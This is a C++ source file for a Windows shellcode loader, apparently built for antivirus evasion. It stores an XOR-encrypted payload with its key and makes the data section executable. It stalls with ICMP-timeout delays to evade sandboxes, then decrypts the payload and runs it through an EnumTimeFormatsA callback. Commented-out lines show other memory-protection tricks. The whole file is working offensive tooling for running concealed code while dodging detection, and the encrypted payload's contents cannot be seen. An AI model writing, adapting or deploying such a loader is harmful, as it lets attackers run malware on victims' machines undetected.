// DelayXorLoader.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <winsock2.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>

using namespace std;
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
//将data部分权限设为可读可写可执行
#pragma comment(linker, "/section:.data,RWE") 

unsigned char buf[] = "\x1b\x3f\x4f\xc9\x6a\x72\x3f\x35\x28\x3b\x35\xb1\x43\x7\xe\xe0\x67\x60\x22\x80\x20\x1\x5e\x8a\xee\x54\x1a\x15\x97\x21\x70\xb\x90\xf\x56\x9\x63\x8\xa2\xae\x23\xfa\x28\x2a\xef\x26\xbe\x70\xde\x92\xfe\x36\x83\xa\xa6\xab\x27\xb9\x89\xdc\x2\x71\xdc\xab\x96\x37\x41\xd7\x6\xb4\x84\xf0\x32\x2a\x8c\x4f\x74\xd1\xed\x96\x2a\xf3\x26\xee\x80\x2c\xc\xb6\xb6\x99\x39\xa6\x40\x8d\xcb\xdf\xc3\xcd\xdf\xf0\x5\x9b\x1c\xa7\x2f\x74\x18\x36\x65\xaa\xff\xa3\x92\x33\x81\xf\xf4\x20\x87\x14\x66\xb6\x1a\x73\x74\xc0\x96\xf7\xc1\x50\x43\x4f\x2d\x10\xf5\x18\x55\x34\x1f\x49\x1\xfc\x8b\x69\xd8\xb6\x8a\xbb\x7a\x6c\x6e\x89\xe9\xcb\xa3\xeb\xd2\x78\x78\x8\x59\x0\x58\x1e\xa1\xe6\x80\xaf\x32\x6c\x40\x8b\x4d\x5\xdb\x7d\xae\x74\x56\xb6\xd4\x8e\x73\x42\x4f\xba\x31\x4d\xae\xad\x3\xfb\xce\xa6\x23\x71\x6c\xfb\x7d\xd0\x7\xef\xee\xeb\x52\x84\xe4\xf3\xb5\xa6\x5c\x94\xdd\xf9\xad\xb2\xbb\x41\xd2\xcd\x9c\xcf\x57\xa\x93\xe\xa9\xf\x9\x71\x46\x22\xec\xcb\x76\xf8\x1f\x17\xe0\xcd\xaf\xe0\x7b\xb4\x38\xd1\x29\x9c\x55\x9\xc6\x15\x89\x7c\x3a\xb\x99\x2d\xa7\xcd\x80\x7a\xac\xa\x17\xfa\xb9\x85\xe0\xc\xd3\xac\xa0\xd3\xf6\x96\x9b\xdc\x2c\x57\x8e\x87\x44\x70\x26\xaf\xa9\xbf\xf5\xff\xc7\xda\xa8\x95\x52\x66\x9b\x3d\xe\x1\x46\x40\x80\x6\x4a\x3a\xbf\xb0\x0\xfa\x26\xa2\x94\xc9\x74\x73\x7b\x1e\x10\xbc\xf0\xb9\x86\x2e\x35\xf5\xcf\xd8\x55\x6b\x24\x2f\x7f\x2\x43\xc5\xde\x37\x9f\xfc\x78\xcd\x7d\xf1\xff\x91\xbf\x8c\xe6\x86\x6b\xa3\xb0\xe6\xe0\x67\xbc\xa3\x77\xc8\x5a\xe7\xe2\x9\x18\x34\x69\x9f\xab\x66\xd0\xdb\x67\x2a\xe0\x58\x10\x99\x20\xe4\x29\xb0\xea\xee\x3a\x43\x4a\xea\xee\x8c\xa5\x57\x73\xd6\x9e\x93\xc2\xe5\x19\x96\xfe\x91\xe0\xd9\xaf\x3e\x9a\xaa\xb8\x43\x3d\xf5\x7d\x55\x13\x91\xcc\x5d\x23\x16\xf2\xe8\x6a\xcf\x45\xd3\x9f\x4b\x46\x4c\x97\x10\x26\xe9\x7\x35\x24\x9a\x1d\xb8\x24\xf2\xc2\x78\x31\xae\x16\x81\x21\xb3\x18\x9e\x67\xbd\xea\xd9\xd0\xb8\x32\x2a\x99\xf0\xf1\xfa\x9d\x77\xe7\x4f\xb2\xbb\x28\x86\x13\x80\xc7\xff\xcd\x78\x8b\xed\x19\x56\xc6\x2e\xf3\x6a\x6d\x3f\xe8\x1d\x52\xb9\x42\x3e\x2a\x99\xb2\x43\x75\x81\xcc\x45\x54\xe9\x2c\x84\xb9\xf2\xc6\x93\xe8\x26\x46\x5\x8d\xaa\x99\x29\x4f\x5e\x4d\x82\xe\x9c\xd9\x91\xd5\xd\x75\x4a\x8\x40\x99\x12\x73\xfd\x2a\xc7\x90\x8b\xd8\xb5\xb3\xe4\x14\xad\x22\xc4\x3d\xf7\xa4\x8c\x20\x59\x83\x9\x15\xee\xe4\x20\x6\x82\x11\x49\x1c\xd\xf7\xa0\xbf\x75\xa1\xdd\x9d\x97\x9e\x85\x57\x6a\x9e\x85\xa3\xa0\xdf\x6\x41\xc2\x34\x71\x99\x7e\xd\xdf\xd\xd0\x3f\xf9\x7c\xf\x6f\x11\xdd\xe3\xff\xc8\x98\x70\xbc\x96\xe7\x63\xe2\x8b\x33\x14\x55\x6d\x0\x9b\x33\xf4\xbe\x9e\x24\x14\xbc\xc\x82\xfe\xf8\xf2\xae\x6e\xda\xc3\xe0\x9c\x31\xd8\x72\x9\x2b\xf1\xde\x78\x62\x2b\x8\x77\xe5\x91\xbd\x9d\x8a\xe1\x59\xc8\xf9\xa0\xa0\xc0\xf7\x9d\xc7\x48\x3\x7d\x62\x34\xfb\x16\xec\x8c\x0\x22\x33\x11\x73\x6\xf7\x47\xc7\x31\xbf\x8\x71\x78\x7e\xaf\x53\x51\xd6\x39\x6c\x9b\xda\x16\x1e\xfb\x51\x56\x3d\xe7\xb1\xbb\xc1\x5b\xb1\xa9\xff\x9d\xc8\x9b\x60\x93\xe3\x11\xb1\x43\x40\x83\x5a\x83\x60\x7c\x52\x76\x56\xf\xd9\xda\xec\xdd\xcb\x20\xe4\x6f\xc8\x28\xb2\x68\x68\x2d\xf6\x63\x37\x72\xda\xa7\x71\x81\x61\xde\x49\xa\xda\x78\x64\x61\x46\x94\xa9\xdc\xa7\xfa\x5d\xe2\xc5\x1e\xb2\x20\xc8\xeb\xb\x64\xbe\xd4\x4e\x5c\x3c\xc\x94\x5d\x8\xa\xc5\x27\x6e\x29\x1d\xfc\xb6\x1a\xc3\xf9\x18\xdb\xe7\x85\xa6\xde\x82\xf2\x5f\x85\x59\x27\xe7\x63\xe3\xff\x78\xa3\xdf\x7e\xc7\x38\xd\x3f\x61\xdd\x2a\xb5\xa5\x69\x54\xe1\x38\x5\xa8\xcc\x36\x38\x6e\x79\xd4\x30\x44\x3b\x8\xb6\xe0\x44\xae\xea\xef\x79\xd8\x3e\x31\x2c\x63\xc3\x8a\x7b\x88\x5c\xd7\xc7\x7b\xfd\xac\xf4\x75\xb3\xe\x1b\x31\x10\x5d\x96\x29\xc4\x73\x15\x70\xde\x88\x7b\xb9\x19\x53\xe8\x52\x31\x5b\xdd\xc1\x8b\xca\x72\xde\x3c\x42\x62\x83\xe1\xdb\x9f\xf1\x17\xdb\xdd\x4c\x38\xdc\x82\x81\x21\x38\xfe\x98\xe8\xfd\xd7\xd3\x8a\x8d\x87\xcf\x23\x93\xc4\xe0\x28\x5d\x47\x8f\x12\x21\x19";
unsigned char key[sizeof(buf)] = { 231,119,204,45,154,154,247,53,40,59,116,224,2,87,92,177,49,40,19,82,69,73,213,216,142,28,145,71,143,105,251,89,176,71,221,123,51,64,173,25,105,176,101,27,38,110,143,176,114,174,159,74,129,38,134,234,230,112,132,157,3,176,62,70,196,118,16,159,141,230,164,123,112,22,196,78,164,183,108,238,50,248,36,155,242,167,140,62,182,153,57,238,197,77,191,184,139,204,15,160,142,211,4,227,164,52,56,127,100,122,28,245,218,204,72,78,127,20,15,92,103,96,87,66,189,136,167,55,109,17,130,134,32,81,244,217,109,212,106,184,77,255,199,77,208,243,179,106,15,180,54,205,98,139,135,162,211,168,30,73,210,12,16,90,42,166,156,230,51,188,1,0,73,141,147,124,126,53,14,247,140,208,42,24,14,226,112,20,239,247,75,120,34,134,98,35,147,27,37,145,94,181,166,96,64,109,171,12,74,89,1,254,221,176,19,197,210,47,187,163,249,187,87,75,197,71,32,233,69,248,183,99,86,135,1,222,24,232,53,133,158,41,51,133,234,156,24,92,24,56,15,84,217,61,106,74,35,23,241,180,39,133,121,227,132,250,185,133,186,68,90,109,225,107,77,151,155,220,97,102,71,198,21,49,119,197,170,254,164,190,125,141,33,10,148,153,78,214,119,90,14,201,65,78,123,232,246,57,216,183,23,107,198,161,116,65,187,154,66,238,177,3,109,123,27,206,48,13,29,226,226,103,252,193,19,175,212,104,215,117,137,119,98,241,255,145,213,140,142,6,88,163,176,175,105,135,253,26,115,200,90,231,163,179,109,114,247,25,84,179,152,82,150,98,105,130,89,94,224,27,214,79,21,163,11,138,24,184,175,54,136,81,107,173,97,70,71,37,22,19,99,144,224,217,231,193,85,165,60,207,60,245,125,190,160,120,40,92,35,22,26,106,149,48,186,252,197,41,116,35,151,37,105,200,87,16,100,219,77,227,16,174,146,34,105,155,34,169,113,237,49,169,36,254,195,238,173,156,119,99,218,177,163,215,206,35,166,1,246,250,122,194,62,193,137,171,132,46,194,191,76,5,235,122,182,57,57,18,174,84,30,252,99,26,98,178,250,105,117,180,131,100,4,204,44,209,202,151,180,190,169,65,35,107,249,144,185,100,32,36,36,238,98,253,246,164,251,61,85,98,107,47,244,98,18,137,67,165,252,238,227,149,254,183,93,232,2,243,19,199,159,172,119,48,237,109,122,153,151,0,72,214,49,124,50,60,204,128,235,7,200,185,248,249,234,170,98,68,174,172,174,170,223,51,14,227,100,84,217,63,93,132,57,140,111,163,36,58,91,57,141,189,214,255,219,51,149,161,154,71,167,194,112,85,7,64,83,207,114,186,250,223,118,80,145,77,204,170,177,164,231,60,143,144,205,200,116,139,38,36,109,184,146,61,67,15,64,92,173,187,189,168,197,192,9,237,185,225,240,155,195,193,151,18,91,72,86,28,171,72,197,187,67,97,26,38,14,34,178,14,132,112,237,37,34,44,63,225,23,16,132,125,65,218,148,66,87,173,24,4,104,180,156,239,132,8,229,132,185,212,132,222,65,183,171,58,249,105,64,182,21,162,48,89,18,55,6,84,237,134,188,135,147,21,208,71,152,118,155,95,43,110,223,84,74,86,159,238,50,192,51,243,26,94,155,54,32,32,20,208,132,157,233,174,20,180,140,76,231,115,229,191,78,55,234,249,8,21,112,73,181,121,64,33,141,13,110,28,82,221,230,63,131,184,72,128,211,217,246,132,218,199,107,173,9,121,206,84,227,190,198,83,106,220,145,199,216,119,80,20,144,181,165,41,84,160,128,5,184,204,54,121,215,57,212,48,68,122,178,238,68,23,75,21,58,49,75,109,98,100,234,36,194,242,121,20,94,29,58,69,172,212,117,179,71,146,200,81,231,132,191,77,145,234,165,150,11,191,153,156,147,156,228,87,208,218,137,138,9,247,30,73,149,58,219,185,147,154,241,23,219,221,28,251,52,253,124,222,199,207,161,218,211,230,229,178,163,182,254,18,189,245,211,24,93,71,143,18,33,25 };

void DeXor() {
	for (int i = 0; i < sizeof(buf); i++) {
		buf[i] = buf[i] ^ key[i];
	}
}


// 利用icmp发送请求包设置响应时间为delayInMillis
BOOL timing_IcmpSendEcho(UINT delayInMillis)
{

	HANDLE hIcmpFile;
	unsigned long DestinationAddress = INADDR_NONE;
	char SendData[32] = "Data Buffer";
	LPVOID ReplyBuffer = NULL;
	DWORD ReplySize = 0;
	const char ipaddr[] = "224.0.0.0";

	hIcmpFile = IcmpCreateFile();
	if (hIcmpFile == INVALID_HANDLE_VALUE) {
		printf("\tUnable to open handle.\n");
		printf("IcmpCreatefile returned error: %u\n", GetLastError());
		return TRUE;
	}

	//
	// Size of ICMP_ECHO_REPLY + size of send data + 8 extra bytes for ICMP error message
	//
	ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData) + 8;
	ReplyBuffer = (VOID*)malloc(ReplySize);
	if (ReplyBuffer == NULL) {
		IcmpCloseHandle(hIcmpFile);
		printf("\tUnable to allocate memory\n");
		return TRUE;
	}

	IcmpSendEcho(hIcmpFile, DestinationAddress, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, delayInMillis);
	IcmpCloseHandle(hIcmpFile);
	free(ReplyBuffer);

	return FALSE;
}

int main(int argc,char *argv[])
{
	if (argv[1] <= 0) {
		printf("ohnonononono");
		return 0;
	}
	cout << argv[1] << endl;
	char *LP = NULL;
	LP = (char*)malloc(409600* sizeof(char));
	if (LP) {
		printf("yyy\n");
		free(LP);
		timing_IcmpSendEcho(3000);
		DeXor();
		printf("yyy\n");
		timing_IcmpSendEcho(3500);
		//回调函数
		EnumTimeFormatsA((TIMEFMT_ENUMPROCA)(&buf), LOCALE_USER_DEFAULT, 0);
	}
	else
	{
		Sleep(2000);
		printf("1212");
	}
	
	/*printf("%d\n", argc);
	printf("%s\n", args[1]);
	std::cout << args[1] << '\n';*/
	
	/*
	//为buf动态分配内存空间，返回指向地址的指针
	LPVOID lpAddress = NULL;	//定义未知类型指针
	lpAddress = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	//MEM_RESERVE | MEM_COMMIT = 0x3000  PAGE_EXECUTE_READWRITE = 0x40
	DWORD dw;
	timing_IcmpSendEcho(2000);
	//Sleep(2000);
	unsigned int* lp2 = (unsigned int*)lpAddress;
	unsigned int** lp3 = &lp2;
	VirtualProtect(*lp3, sizeof(buf), PAGE_READWRITE, &dw);
	*/
	
	printf("1111");
	//Sleep(2000);
	//VirtualProtect(*lp3, sizeof(buf), PAGE_EXECUTE, &dw);

	//((void(*)())(LPVOID(&buf)))();	//将指针lpAdress强制转换为返回值为空且参数值可变的函数指针，并调用函数


}